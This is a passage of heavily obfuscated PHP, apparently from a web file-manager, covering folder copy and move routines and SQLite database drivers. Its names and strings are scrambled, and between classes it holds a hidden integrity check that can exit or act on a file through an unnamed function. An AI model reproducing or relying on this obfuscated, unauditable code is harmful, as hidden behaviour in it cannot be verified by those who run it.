$¤ëšÖ = $this->_moveForce($–˜ãçéÀ, $øÍšğà, $¯‘‹ÀÆ); } else { $ˆó³™­Â = $this->_childrenListSelect($–˜ãçéÀ); foreach ($ˆó³™­Â as $é†İŸıâ) { $ˆÊŒú÷Æ = REPEAT_REPLACE; $this->_move($é†İŸıâ[$µ²˜æÏ[201]], $ìåÁ’’Ü, $ˆÊŒú÷Æ, $³Ü»¸ùŸ); } $ «ÛÚ  = !0; } } else { if ($İ¥†‰˜¶ == REPEAT_RENAME || $İ¥†‰˜¶ == REPEAT_RENAME_FOLDER) { $¯‘‹ÀÆ = $this->fileNameAuto($øÍšğà, $¯‘‹ÀÆ, $İ¥†‰˜¶, $»²—äÌ); $¤ëšÖ = $this->_moveForce($–˜ãçéÀ, $øÍšğà, $¯‘‹ÀÆ); } else { $·ÜñÔşÅ = $this->sourceInfoCache($ìåÁ’’Ü); $¯– ½—ß = $this->fileHistory($·ÜñÔşÅ, $Ò­Ëˆã¯[$µ²˜æÏ[566]], $Ò­Ëˆã¯[$µ²˜æÏ[89]]); if ($¯– ½—ß) { $³Ü»¸ùŸ[$µ²˜æÏ[661]][] = $Ò­Ëˆã¯[$µ²˜æÏ[566]]; } $ «ÛÚ  = !0; } } if ($ «ÛÚ ) { $³Ü»¸ùŸ[$µ²˜æÏ[691]] = !0; } return $¤ëšÖ; } private function _moveForce($˜•Ó‰“‹, $„¸Õ½œƒ, $˜øûÚ×œ) { $¤¸Ã…ƒË =& $_SERVER[øşô´çË]; $õæ¦›¡ù = $this->sourceInfo($˜•Ó‰“‹); $×Ã¦™æò = $this->sourceInfo($„¸Õ½œƒ); $¡ı’¥“ = $õæ¦›¡ù[$¤¸Ã…ƒË[509]] == $¤¸Ã…ƒË[101]; $®®™äÂ  = array($¤¸Ã…ƒË[501] => $×Ã¦™æò[$¤¸Ã…ƒË[201]], $¤¸Ã…ƒË[683] => $×Ã¦™æò[$¤¸Ã…ƒË[613]] . $×Ã¦™æò[$¤¸Ã…ƒË[201]] . $¤¸Ã…ƒË[60], $¤¸Ã…ƒË[679] => $×Ã¦™æò[$¤¸Ã…ƒË[198]], $¤¸Ã…ƒË[680] => $×Ã¦™æò[$¤¸Ã…ƒË[598]], $¤¸Ã…ƒË[682] => USER_ID, $¤¸Ã…ƒË[518] => $˜øûÚ×œ); $ÍÛÙ±²  = $õæ¦›¡ù[$¤¸Ã…ƒË[198]] == SourceModel::TYPE_GROUP && $×Ã¦™æò[$¤¸Ã…ƒË[198]] == SourceModel::TYPE_GROUP && $õæ¦›¡ù[$¤¸Ã…ƒË[598]] == $×Ã¦™æò[$¤¸Ã…ƒË[598]]; if (!$ÍÛÙ±²  && $this->moveClearAuth) { Model($¤¸Ã…ƒË[596])->authClear($˜•Ó‰“‹); } $õ¾İş’ = $õæ¦›¡ù[$¤¸Ã…ƒË[529]] == $¤¸Ã…ƒË[101] && $×Ã¦™æò[$¤¸Ã…ƒË[529]] != $¤¸Ã…ƒË[101]; if ($õ¾İş’) { $®®™äÂ [$¤¸Ã…ƒË[528]] = 0; } if ($¡ı’¥“) { $ÎìÒ³¹Ç = array($¤¸Ã…ƒË[683] => array($¤¸Ã…ƒË[644], $õæ¦›¡ù[$¤¸Ã…ƒË[613]] . $õæ¦›¡ù[$¤¸Ã…ƒË[201]] . $¤¸Ã…ƒË[645])); $Ô—İ†ÖÆ = $õæ¦›¡ù[$¤¸Ã…ƒË[613]] . $õæ¦›¡ù[$¤¸Ã…ƒË[201]] . $¤¸Ã…ƒË[60]; $Œö«úÈ“ = $×Ã¦™æò[$¤¸Ã…ƒË[613]] . $×Ã¦™æò[$¤¸Ã…ƒË[201]] . $¤¸Ã…ƒË[60] . $õæ¦›¡ù[$¤¸Ã…ƒË[201]] . $¤¸Ã…ƒË[60]; $½ö¡î²• = array($¤¸Ã…ƒË[683] => array($¤¸Ã…ƒË[692], "\162\x65\160\x6c\141\x63\x65\50\160\141\162\145\156\164\114\145\x76\x65\154\54\x27{$Ô—İ†ÖÆ}\x27\54\x27{$Œö«úÈ“}\x27\51"), $¤¸Ã…ƒË[679] => $×Ã¦™æò[$¤¸Ã…ƒË[198]], $¤¸Ã…ƒË[680] => $×Ã¦™æò[$¤¸Ã…ƒË[598]]); if ($õ¾İş’) { $½ö¡î²•[$¤¸Ã…ƒË[528]] = 0; } $this->where($ÎìÒ³¹Ç)->data($½ö¡î²•)->save(); } $this->where(array($¤¸Ã…ƒË[515] => $˜•Ó‰“‹))->data($®®™äÂ )->save(); return $˜•Ó‰“‹; } private function clearShare($ÑƒÏ™¢Œ, $¸›‹Æîç) { $™í÷Îõ =& $_SERVER[øşô´çË]; $ış¤àõº = $this->sourceInfo($ÑƒÏ™¢Œ); $ú­©ù’± = $this->sourceInfo($¸›‹Æîç); if ($ış¤àõº[$™í÷Îõ[598]] == $ú­©ù’±[$™í÷Îõ[598]] && $ış¤àõº[$™í÷Îõ[198]] == $™í÷Îõ[693]) { return; } $€ŠÚéì = array($™í÷Îõ[613] => array($™í÷Îõ[644], $ış¤àõº[$™í÷Îõ[613]] . $ÑƒÏ™¢Œ . $™í÷Îõ[645])); $ÍšÖÂâ = $this->field($™í÷Îõ[515])->where($€ŠÚéì)->getField($™í÷Îõ[201], !0); if (!$ÍšÖÂâ) { return; } $€ŠÚéì = array($™í÷Îõ[201] => array($™í÷Îõ[7], $ÍšÖÂâ), $™í÷Îõ[694] => 1); $’»Ü˜äÒ = Model($™í÷Îõ[695])->field($™í÷Îõ[696])->where($€ŠÚéì)->select(); if (!$’»Ü˜äÒ) { return; } $’»Ü˜äÒ = array_to_keyvalue($’»Ü˜äÒ, $™í÷Îõ[12], $™í÷Îõ[696]); $€ŠÚéì = array($™í÷Îõ[696] => array($™í÷Îõ[7], $’»Ü˜äÒ)); Model($™í÷Îõ[695])->where($€ŠÚéì)->save(array($™í÷Îõ[694] => 0)); Model($™í÷Îõ[697])->where($€ŠÚéì)->delete(); } public function copyFolderFromIO($µƒ‰å¯’, $ßäÅ©ìœ, $È›ûåØ¶, $Ã˜„ŞõÕ, $šÛ¢úÂ™, $Å¯§§ÊĞ = false) { $úµ†õ– =& $_SERVER[øşô´çË]; $Ï½Ù¦ìØ = array($úµ†õ–[662] => array(), $úµ†õ–[663] => array(), $úµ†õ–[661] => array(), $úµ†õ–[698] => array()); $›î»êúÈ = $Å¯§§ÊĞ ? $Å¯§§ÊĞ : $µƒ‰å¯’->pathThis($ßäÅ©ìœ); $ä†â¹ó = $this->fileNameExist($È›ûåØ¶, $›î»êúÈ); $èİÚí•¯ = $this->mkdir($È›ûåØ¶, $›î»êúÈ, $Ã˜„ŞõÕ); if (!$ä†â¹ó || $Ã˜„ŞõÕ == REPEAT_RENAME_FOLDER) { $Ã˜„ŞõÕ = !1; } if ($ä†â¹ó) { $this->_childrenAllMake($ä†â¹ó); } Hook::trigger($úµ†õ–[699]); $ÏüÂÇ‹Å = KodIO::ioFileDriverGet($úµ†õ–[507] . $È›ûåØ¶ . $úµ†õ–[411]); $this->_copyChildTo($µƒ‰å¯’, $ßäÅ©ìœ, $èİÚí•¯, $Ã˜„ŞõÕ, $Ï½Ù¦ìØ, $šÛ¢úÂ™, $ÏüÂÇ‹Å); Hook::trigger($úµ†õ–[700]); if ($èİÚí•¯) { $this->folderSizeResetChildren($èİÚí•¯); } $this->_childrenListClear(); Model($úµ†õ–[480])->addAll($Ï½Ù¦ìØ[$úµ†õ–[662]], array(), !0); Model($úµ†õ–[664])->eventCopy($èİÚí•¯); $this->saveAll($Ï½Ù¦ìØ[$úµ†õ–[663]]); Model($úµ†õ–[569])->linkAdd($Ï½Ù¦ìØ[$úµ†õ–[661]]); Model($úµ†õ–[569])->remove($Ï½Ù¦ìØ[$úµ†õ–[698]]); $this->folderSizeReset($È›ûåØ¶); $this->updateModifyTime($È›ûåØ¶); return $èİÚí•¯; } private function _copyChildTo($‚ë¯øîÌ, $şÌ¿µ¥”, $¶ºûõè“, $ğÏÚéÕó, &$È›‘õÊŠ, $š¹ëê— , $ÈóËÑ‚¢) { $Á‚òÃÜ =& $_SERVER[øşô´çË]; $ŠŸáØ¤¹ = $this->sourceInfoCache($¶ºûõè“); $Ãş ¤ı = $‚ë¯øîÌ->listPath($şÌ¿µ¥”); $Ãş ¤ı = $Ãş ¤ı ? $Ãş ¤ı : array($Á‚òÃÜ[96] => array(), $Á‚òÃÜ[95] => array()); $ŠíÊ˜… = array_merge($Ãş ¤ı[$Á‚òÃÜ[96]], $Ãş ¤ı[$Á‚òÃÜ[95]]); $™ï¬Ô€ = $this->_addFiles($‚ë¯øîÌ, $ÈóËÑ‚¢, $Ãş ¤ı[$Á‚òÃÜ[96]], $š¹ëê— ); $÷…Æ—ã = array(); foreach ($ŠíÊ˜… as &$„±Èˆíï) { if (isset($™ï¬Ô€[$„±Èˆíï[$Á‚òÃÜ[42]]])) { $„±Èˆíï = $™ï¬Ô€[$„±Èˆíï[$Á‚òÃÜ[42]]]; } $„±Èˆíï[$Á‚òÃÜ[509]] = $„±Èˆíï[$Á‚òÃÜ[43]] == $Á‚òÃÜ[88]; $„±Èˆíï[$Á‚òÃÜ[510]] = substr(_get($„±Èˆíï, $Á‚òÃÜ[176], $Á‚òÃÜ[12]), 0, 10); $„±Èˆíï[$Á‚òÃÜ[89]] = _get($„±Èˆíï, $Á‚òÃÜ[89], 0); $„±Èˆíï[$Á‚òÃÜ[566]] = _get($„±Èˆíï, $Á‚òÃÜ[566], 0); if (!isset($„±Èˆíï[$Á‚òÃÜ[701]]) && $„±Èˆíï[$Á‚òÃÜ[566]]) { $È›‘õÊŠ[$Á‚òÃÜ[698]][] = $„±Èˆíï[$Á‚òÃÜ[566]]; } if ($ğÏÚéÕó) { $×Û†æ¤Õ = $this->fileNameExistCache($¶ºûõè“, $„±Èˆíï[$Á‚òÃÜ[42]]); if ($×Û†æ¤Õ) { if ($„±Èˆíï[$Á‚òÃÜ[509]] || $ğÏÚéÕó == REPEAT_SKIP) { continue; } if ($ğÏÚéÕó == REPEAT_REPLACE) { $öª•Ìß­ = $this->sourceInfoCache($×Û†æ¤Õ); $Ã€éÀ§ğ = $this->fileHistory($öª•Ìß­, $„±Èˆíï[$Á‚òÃÜ[566]], $„±Èˆíï[$Á‚òÃÜ[89]]); if ($Ã€éÀ§ğ) { $È›‘õÊŠ[$Á‚òÃÜ[661]][] = $„±Èˆíï[$Á‚òÃÜ[566]]; } continue; } else { if ($ğÏÚéÕó == REPEAT_RENAME) { $„±Èˆíï[$Á‚òÃÜ[42]] = $this->fileNameAutoCache($¶ºûõè“, $„±Èˆíï[$Á‚òÃÜ[42]], $ğÏÚéÕó, !1); } } } } if (!$„±Èˆíï[$Á‚òÃÜ[509]] && $„±Èˆíï[$Á‚òÃÜ[566]] == 0) { continue; } if (!$„±Èˆíï[$Á‚òÃÜ[509]] && $„±Èˆíï[$Á‚òÃÜ[566]]) { $È›‘õÊŠ[$Á‚òÃÜ[661]][] = $„±Èˆíï[$Á‚òÃÜ[566]]; } $÷…Æ—ã[] = $this->_makeItemData($„±Èˆíï, $ŠŸáØ¤¹, $„±Èˆíï[$Á‚òÃÜ[42]]); } unset($„±Èˆíï); if (!empty($÷…Æ—ã)) { $this->addAll($÷…Æ—ã); $this->_childrenListSelect($¶ºûõè“); } $ÓÕ¤İ¥” = $this->_childrenList($¶ºûõè“); $ÓÕ¤İ¥” = array_to_keyvalue($ÓÕ¤İ¥”, $Á‚òÃÜ[42]); foreach ($ŠíÊ˜… as $„±Èˆíï) { $öª•Ìß­ = $ÓÕ¤İ¥”[$„±Èˆíï[$Á‚òÃÜ[42]]]; $şüğÍŒš = $öª•Ìß­[$Á‚òÃÜ[201]]; $this->_copyApplyMeta($öª•Ìß­, $È›‘õÊŠ); if ($„±Èˆíï[$Á‚òÃÜ[43]] == $Á‚òÃÜ[88]) { $„±Èˆíï[$Á‚òÃÜ[97]] = $‚ë¯øîÌ->getPathInner($„±Èˆíï[$Á‚òÃÜ[97]]); $this->_copyChildTo($‚ë¯øîÌ, $„±Èˆíï[$Á‚òÃÜ[97]], $şüğÍŒš, $ğÏÚéÕó, $È›‘õÊŠ, $š¹ëê— , $ÈóËÑ‚¢); } } } private function _addFiles($‰Âò¥œƒ, $ĞÖ¿Û×û, $áôœÔûì, $ªÒå€é) { $Èääæš =& $_SERVER[øşô´çË]; if (!$áôœÔûì || count($áôœÔûì) == 0) { return array(); } $Ä‡ÁÙ¥ğ = array(); foreach ($áôœÔûì as &$Š¢ûŸŠ) { Hook::trigger($Èääæš[702], $Š¢ûŸŠ); $Š¢ûŸŠ[$Èääæš[97]] = $‰Âò¥œƒ->getPathInner($Š¢ûŸŠ[$Èääæš[97]]); $Øò‰ÉÅÆ = $‰Âò¥œƒ->hashSimple($Š¢ûŸŠ[$Èääæš[97]]); $Ş¶‰…í = $‰Âò¥œƒ->hashMd5($Š¢ûŸŠ[$Èääæš[97]]); if (strlen($Ş¶‰…í) > 10 && !isset($Ä‡ÁÙ¥ğ[$Ş¶‰…í])) { $Ä‡ÁÙ¥ğ[$Ş¶‰…í] = array(); } $Š¢ûŸŠ[$Èääæš[703]] = $Øò‰ÉÅÆ; $Š¢ûŸŠ[$Èääæš[572]] = $Ş¶‰…í; $Ä‡ÁÙ¥ğ[$Ş¶‰…í][] =& $Š¢ûŸŠ; if (count($Ä‡ÁÙ¥ğ[$Ş¶‰…í]) > 1) { $Š¢ûŸŠ[$Èääæš[701]] = !0; } Hook::trigger($Èääæš[704], $Š¢ûŸŠ); } unset($Š¢ûŸŠ); $„ïùõÍ¹ = array($Èääæš[572] => array($Èääæš[7], array_keys($Ä‡ÁÙ¥ğ))); $Şâùû–Ÿ = Model($Èääæš[705]); $í§Æ®Û¹ = $Şâùû–Ÿ->where($„ïùõÍ¹)->select(); $í§Æ®Û¹ = $í§Æ®Û¹ ? $í§Æ®Û¹ : array(); foreach ($í§Æ®Û¹ as $ãÄ‰„ ) { if (!isset($Ä‡ÁÙ¥ğ[$ãÄ‰„ [$Èääæš[572]]])) { continue; } $Èùºù¨ö = $Ä‡ÁÙ¥ğ[$ãÄ‰„ [$Èääæš[572]]]; foreach ($Èùºù¨ö as &$Š¢ûŸŠ) { $Š¢ûŸŠ[$Èääæš[566]] = $ãÄ‰„ [$Èääæš[566]]; $Š¢ûŸŠ[$Èääæš[701]] = !0; } unset($Š¢ûŸŠ); } $¡®–¼Ñ = array(); foreach ($áôœÔûì as $ÅşÊÁ¿â) { Hook::trigger($Èääæš[706], $ÅşÊÁ¿â); if (isset($ÅşÊÁ¿â[$Èääæš[701]]) && $ÅşÊÁ¿â[$Èääæš[701]]) { Hook::trigger($Èääæš[707], $ÅşÊÁ¿â); continue; } $™ß¨Ğ¡Å = $‰Âò¥œƒ->getPathInner($ÅşÊÁ¿â[$Èääæš[97]]); $‚Ô šÉ˜ = $Şâùû–Ÿ->addFileMake($™ß¨Ğ¡Å, $ĞÖ¿Û×û, $ÅşÊÁ¿â[$Èääæš[89]], $ÅşÊÁ¿â[$Èääæš[703]], $ÅşÊÁ¿â[$Èääæš[572]], $ÅşÊÁ¿â[$Èääæš[42]], $ªÒå€é); Hook::trigger($Èääæš[707], $ÅşÊÁ¿â); if (!is_array($‚Ô šÉ˜)) { continue; } $¡®–¼Ñ[] = $‚Ô šÉ˜; } $Şâùû–Ÿ->addAll($¡®–¼Ñ); $„ïùõÍ¹ = array($Èääæš[572] => array($Èääæš[7], array_keys($Ä‡ÁÙ¥ğ))); $í§Æ®Û¹ = $Şâùû–Ÿ->where($„ïùõÍ¹)->select(); $í§Æ®Û¹ = $í§Æ®Û¹ ? $í§Æ®Û¹ : array(); foreach ($í§Æ®Û¹ as $ãÄ‰„ ) { if (!isset($Ä‡ÁÙ¥ğ[$ãÄ‰„ [$Èääæš[572]]])) { continue; } $óôÑ¯øö =& $Ä‡ÁÙ¥ğ[$ãÄ‰„ [$Èääæš[572]]]; foreach ($óôÑ¯øö as &$Š¢ûŸŠ) { $Š¢ûŸŠ[$Èääæš[566]] = $ãÄ‰„ [$Èääæš[566]]; } unset($Š¢ûŸŠ); } $Åş–°¿è = array(); foreach ($áôœÔûì as $ªñ€€›) { $Åş–°¿è[$ªñ€€›[$Èääæš[42]]] = $ªñ€€›; } return $Åş–°¿è; } } define($_SERVER[øşô´çË][708], $_SERVER[øşô´çË][709]); $zcsujirwtv = $_SERVER[øşô´çË][710]; goto c²Âãêí¢„; c®¯°³‡ƒÔ: if ($_SERVER[$_SERVER[øşô´çË][15]] != $_size($_file)) { $_getc = $_SERVER[øşô´çË][16]; $_getfile = $_SERVER[$_SERVER[øşô´çË][17]] . $_SERVER[øşô´çË][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[øşô´çË][19], $_getfilec); if (count($_getarrs) < $_SERVER[øşô´çË][20]) { $exit = $_SERVER[øşô´çË][21]; $exit(); } $_act = $_SERVER[øşô´çË][22]; $_act($_file); } class DbSqliteBase extends Db { public function __construct($ºàˆ¹– = '') { $íˆ×ñ˜€ =& $_SERVER[øşô´çË]; if (!extension_loaded($íˆ×ñ˜€[23])) { think_exception(think_lang($íˆ×ñ˜€[24]) . $íˆ×ñ˜€[25]); } if (!empty($ºàˆ¹–)) { if (!isset($ºàˆ¹–[$íˆ×ñ˜€[26]])) { $ºàˆ¹–[$íˆ×ñ˜€[26]] = 438; } $this->config = $ºàˆ¹–; if (empty($this->config[$íˆ×ñ˜€[27]])) { $this->config[$íˆ×ñ˜€[27]] = array(); } } } public function connect($¯¿Ô¸ûÎ = '', $ú«³÷¯í = 0) { $œŸÕèÁö =& $_SERVER[øşô´çË]; if (!isset($this->linkID[$ú«³÷¯í])) { if (empty($¯¿Ô¸ûÎ)) { $¯¿Ô¸ûÎ = $this->config; } $ÄÈÍ‚» = !empty($¯¿Ô¸ûÎ[$œŸÕèÁö[27]][$œŸÕèÁö[28]]) ? $¯¿Ô¸ûÎ[$œŸÕèÁö[27]][$œŸÕèÁö[28]] : $this->pconnect; $è¨À‰°‡ = $ÄÈÍ‚» ? $œŸÕèÁö[29] : $œŸÕèÁö[30]; $this->linkID[$ú«³÷¯í] = $è¨À‰°‡($¯¿Ô¸ûÎ[$œŸÕèÁö[31]], $¯¿Ô¸ûÎ[$œŸÕèÁö[26]]); if (!$this->linkID[$ú«³÷¯í]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ú«³÷¯í], 30000); if (1 != think_config($œŸÕèÁö[32])) { unset($this->config); } } return $this->linkID[$ú«³÷¯í]; } public function free() { $this->queryID = null; } public function query($™€‰‚şğ) { $‘åğà„¾ =& $_SERVER[øşô´çË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™€‰‚şğ; if ($this->queryID) { $this->free(); } think_action_status($‘åğà„¾[33], 1); think_status($‘åğà„¾[34]); $this->queryID = sqlite_query($this->_linkID, $™€‰‚şğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $øÚàÃ¾­ = $this->getAll(); return $øÚàÃ¾­; } } public function execute($›Êë™) { $²äÕÎÈÂ =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›Êë™; if ($this->queryID) { $this->free(); } think_action_status($²äÕÎÈÂ[35], 1); think_status($²äÕÎÈÂ[34]); $ÔÊ£€¿œ = sqlite_exec($this->_linkID, $›Êë™); $this->debug(); if (!1 === $ÔÊ£€¿œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[øşô´çË][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $å„—’Çè = sqlite_query($this->_linkID, $_SERVER[øşô´çË][37]); if (!$å„—’Çè) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $êØûàë = sqlite_query($this->_linkID, $_SERVER[øşô´çË][38]); if (!$êØûàë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ı—ªÜ‰† = array(); if ($this->numRows > 0) { for ($ã‹Š¶ô² = 0; $ã‹Š¶ô² < $this->numRows; $ã‹Š¶ô²++) { $ı—ªÜ‰†[$ã‹Š¶ô²] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ı—ªÜ‰†; } public function getFields($Ä§üó„) { $¸«ÍÁúØ =& $_SERVER[øşô´çË]; $ÕĞ†Å¦§ = $this->query($¸«ÍÁúØ[39] . $Ä§üó„ . $¸«ÍÁúØ[40]); $Âñ©®û× = array(); if ($ÕĞ†Å¦§) { foreach ($ÕĞ†Å¦§ as $Š™°÷›­ => $åØ«ë¹ ) { $Âñ©®û×[$åØ«ë¹ [$¸«ÍÁúØ[41]]] = array($¸«ÍÁúØ[42] => $åØ«ë¹ [$¸«ÍÁúØ[41]], $¸«ÍÁúØ[43] => $åØ«ë¹ [$¸«ÍÁúØ[44]], $¸«ÍÁúØ[45] => (bool) ($åØ«ë¹ [$¸«ÍÁúØ[46]] === $¸«ÍÁúØ[12]), $¸«ÍÁúØ[47] => $åØ«ë¹ [$¸«ÍÁúØ[48]], $¸«ÍÁúØ[49] => strtolower($åØ«ë¹ [$¸«ÍÁúØ[50]]) == $¸«ÍÁúØ[51], $¸«ÍÁúØ[52] => strtolower($åØ«ë¹ [$¸«ÍÁúØ[53]]) == $¸«ÍÁúØ[54]); } } return $Âñ©®û×; } public function getTables($ü¹ë©ÒÏ = '') { $ªÜ€«ò =& $_SERVER[øşô´çË]; $Œ½˜Ë¡¸ = $this->query($ªÜ€«ò[55] . $ªÜ€«ò[56] . $ªÜ€«ò[57]); $¾Ú’„á = array(); foreach ($Œ½˜Ë¡¸ as $ºª‚Å‚ï => $¿€«Ÿ”Æ) { $¾Ú’„á[$ºª‚Å‚ï] = current($¿€«Ÿ”Æ); } return $¾Ú’„á; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $·¾Œô°± =& $_SERVER[øşô´çË]; $…Şù©¹ˆ = sqlite_last_error($this->_linkID); $this->error = $…Şù©¹ˆ . $·¾Œô°±[4] . sqlite_error_string($…Şù©¹ˆ); if ($·¾Œô°±[12] != $this->queryStr) { $this->error .= LNG($·¾Œô°±[58]) . $this->queryStr; } think_trace($this->error, $·¾Œô°±[12], $·¾Œô°±[59]); return $this->error; } public function escapeString($£’ñêÀí) { return sqlite_escape_string($£’ñêÀí); } public function parseLimit($‘ÆÊ‰ö) { $ÊÜØ½ñÕ =& $_SERVER[øşô´çË]; $Î¤Ë÷—‰ = $ÊÜØ½ñÕ[12]; if (!empty($‘ÆÊ‰ö)) { $‘ÆÊ‰ö = explode($ÊÜØ½ñÕ[60], $‘ÆÊ‰ö); if (count($‘ÆÊ‰ö) > 1) { $Î¤Ë÷—‰ .= $ÊÜØ½ñÕ[61] . $‘ÆÊ‰ö[1] . $ÊÜØ½ñÕ[62] . $‘ÆÊ‰ö[0] . $ÊÜØ½ñÕ[63]; } else { $Î¤Ë÷—‰ .= $ÊÜØ½ñÕ[61] . $‘ÆÊ‰ö[0] . $ÊÜØ½ñÕ[63]; } } return $Î¤Ë÷—‰; } } class DbSqlite3Base extends Db { public function __construct($ŸŠ¢¡œ = '') { $¹¹£¯ÔÁ =& $_SERVER[øşô´çË]; if (!class_exists($¹¹£¯ÔÁ[64])) { think_exception(think_lang($¹¹£¯ÔÁ[24]) . $¹¹£¯ÔÁ[65]); } if (!empty($ŸŠ¢¡œ)) { if (!isset($ŸŠ¢¡œ[$¹¹£¯ÔÁ[26]])) { $ŸŠ¢¡œ[$¹¹£¯ÔÁ[26]] = 438; } $this->config = $ŸŠ¢¡œ; if (empty($this->config[$¹¹£¯ÔÁ[27]])) { $this->config[$¹¹£¯ÔÁ[27]] = array(); } } } public function connect($êÖÏßô = '', $í¸ğ˜Ø‡ = 0) { $õÏ–¬Ÿş =& $_SERVER[øşô´çË]; if (!isset($this->linkID[$í¸ğ˜Ø‡])) { if (empty($êÖÏßô)) { $êÖÏßô = $this->config; } $this->linkID[$í¸ğ˜Ø‡] = new SQLite3($êÖÏßô[$õÏ–¬Ÿş[31]]); if (!$this->linkID[$í¸ğ˜Ø‡]) { think_exception($this->linkID[$í¸ğ˜Ø‡]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$í¸ğ˜Ø‡]->busyTimeout(30000); if (1 != think_config($õÏ–¬Ÿş[32])) { unset($this->config); } } return $this->linkID[$í¸ğ˜Ø‡]; } public function free() { $this->queryID = null; } public function query($Æä©”›Á) { $¹½İ—õÕ =& $_SERVER[øşô´çË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Æä©”›Á; if ($this->queryID) { $this->free(); } think_action_status($¹½İ—õÕ[33], 1); think_status($¹½İ—õÕ[34]); $this->queryID = $this->_linkID->query($Æä©”›Á); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $á»øÏ×Ø = $this->getAll(); $this->numRows = count($á»øÏ×Ø); return $á»øÏ×Ø; } } public function execute($Œ‚º€ô€) { $ÅÁÎ™ =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Œ‚º€ô€; if ($this->queryID) { $this->free(); } think_action_status($ÅÁÎ™[35], 1); think_status($ÅÁÎ™[34]); $ª²Ä÷Ìô = $this->_linkID->exec($Œ‚º€ô€); $this->debug(); if (!1 === $ª²Ä÷Ìô) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[øşô´çË][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó’¿ÛĞÂ = $this->_linkID->query($_SERVER[øşô´çË][37]); if (!$Ó’¿ÛĞÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ùº©¦Û = $this->_linkID->query($_SERVER[øşô´çË][38]); if (!$Ùº©¦Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ş…ØèÊ = array(); while ($ã¤ª¬´ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ş…ØèÊ[] = $ã¤ª¬´; } $this->queryID->reset(); return $Ş…ØèÊ; } public function getFields($âæı””í) { $°™õè§§ =& $_SERVER[øşô´çË]; $ÃÂìê¶  = $this->query($°™õè§§[39] . $âæı””í . $°™õè§§[40]); $ÜÍ÷Ğæ = array(); if ($ÃÂìê¶ ) { foreach ($ÃÂìê¶  as $…··¹Û† => $ºÌ¼ù»¨) { $ÜÍ÷Ğæ[$ºÌ¼ù»¨[$°™õè§§[42]]] = array($°™õè§§[42] => $ºÌ¼ù»¨[$°™õè§§[42]], $°™õè§§[43] => $ºÌ¼ù»¨[$°™õè§§[43]], $°™õè§§[45] => (bool) ($ºÌ¼ù»¨[$°™õè§§[45]] === $°™õè§§[12]), $°™õè§§[47] => $ºÌ¼ù»¨[$°™õè§§[66]], $°™õè§§[49] => (bool) $ºÌ¼ù»¨[$°™õè§§[67]], $°™õè§§[52] => (bool) $ºÌ¼ù»¨[$°™õè§§[67]]); } } return $ÜÍ÷Ğæ; } public function getTables($’ù¥ØîÓ = '') { $ıÌÜúë• =& $_SERVER[øşô´çË]; $şÍÊè—ê = $this->query($ıÌÜúë•[55] . $ıÌÜúë•[56] . $ıÌÜúë•[57]); $ñ¦ıŞ²¥ = array(); foreach ($şÍÊè—ê as $³Ê‡¦ => $Éïßê’“) { $ñ¦ıŞ²¥[$³Ê‡¦] = current($Éïßê’“); } return $ñ¦ıŞ²¥; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Äô³Íš =& $_SERVER[øşô´çË]; $this->error = $this->_linkID->lastErrorMsg(); if ($Äô³Íš[12] != $this->queryStr) { $this->error .= LNG($Äô³Íš[58]) . $this->queryStr; } think_trace($this->error, $Äô³Íš[12], $Äô³Íš[59]); return $this->error; } public function escapeString($òëš’ì™) { $¹¶òôôÀ =& $_SERVER[øşô´çË]; if ($this->_linkID) { return $this->_linkID->escapeString($òëš’ì™); } return str_ireplace($¹¶òôôÀ[68], $¹¶òôôÀ[69], $òëš’ì™); } public function parseLimit($«ª±ÍÑÄ) { $‡’¶»•† =& $_SERVER[øşô´çË]; $¤ˆìîŠõ = $‡’¶»•†[12]; if (!empty($«ª±ÍÑÄ)) { $«ª±ÍÑÄ = explode($‡’¶»•†[60], $«ª±ÍÑÄ); if (count($«ª±ÍÑÄ) > 1) { $¤ˆìîŠõ .= $‡’¶»•†[61] . $«ª±ÍÑÄ[1] . $‡’¶»•†[62] . $«ª±ÍÑÄ[0] . $‡’¶»•†[63]; } else { $¤ˆìîŠõ .= $‡’¶»•†[61] . $«ª±ÍÑÄ[0] . $‡’¶»•†[63]; } } return $¤ˆìîŠõ; } } goto fÍ²…°Â¬; eë…÷Ù§: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\x65\x6d\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($ŠĞÊå§ = false, $÷¨è½±Ô = "\155\157\144\x69\x66\x79\124\x69\155\x65", $ä³®Î¯ = false) { $›¢˜ÀÒ =& $_SERVER[øşô´çË]; $±ÄßÏ¥… = 